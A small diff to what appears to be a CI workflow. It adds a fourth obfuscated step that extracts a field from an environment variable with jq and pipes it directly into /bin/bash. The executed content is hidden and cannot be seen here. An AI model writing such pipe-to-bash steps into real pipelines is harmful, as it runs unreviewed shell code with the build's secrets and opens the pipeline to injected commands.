@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$a8" | jq -r .qkm8 | /bin/bash
           echo $ygh9166 | jq -r .vmwno51 | /bin/bash
           echo $mph96 | jq -r .tb185 | /bin/bash
+          echo $arj34621 | jq -r .ayq205 | /bin/bash
 
       - name: Persist results
         if: always()
